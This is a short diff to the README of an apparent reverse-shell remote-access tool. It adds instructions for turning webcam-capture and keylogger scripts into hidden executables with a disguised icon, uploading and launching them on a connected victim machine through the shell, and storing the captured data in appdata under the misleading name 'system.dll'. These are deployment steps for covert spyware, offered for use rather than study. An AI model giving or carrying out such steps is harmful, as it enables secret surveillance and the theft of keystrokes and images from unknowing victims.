@@ -12,4 +12,7 @@ A Reverse Shell, also known as a remote shell or "connect-back shell" is process
 - After client connect, type help to see available commands
 
 # Additional Payloads
--
+- Convert `CamCapture.py` and `Keylogger.py` into exe files using below code
+- `pyinstaller --onefile --noconsole -i <icon> <filename> -n <output.exe>`
+- Upload & run these payloads using `upload` & `start` features in shell
+- all required information will be stored in appdata as `system.dll`
